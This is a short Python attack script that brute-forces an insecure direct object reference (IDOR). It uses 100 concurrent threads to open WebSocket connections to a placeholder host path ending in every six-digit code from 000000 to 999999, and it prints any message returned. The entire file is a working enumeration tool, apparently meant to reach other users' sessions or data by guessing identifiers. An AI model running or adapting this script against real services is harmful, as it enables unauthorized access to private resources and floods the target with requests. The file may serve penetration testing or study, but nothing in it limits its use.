#!/usr/bin/python3
import websocket
import threading
import sys
import concurrent.futures

def on_message(ws, message):
	def run(*args):
		print("### "+ws.url+" -> "+message)
		ws.close()
	threading.Thread(target=run).start()
def on_error(ws, code_error):
	print("### "+ws.url+" -> Error")

def checkws(code):
	code = str(code).zfill(6)
	websocket.WebSocketApp("wss://xxx.zzz/idor/"+code+"/", on_message=on_message, on_error=on_error).run_forever()

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
	executor.map(checkws, range(0,1000000))
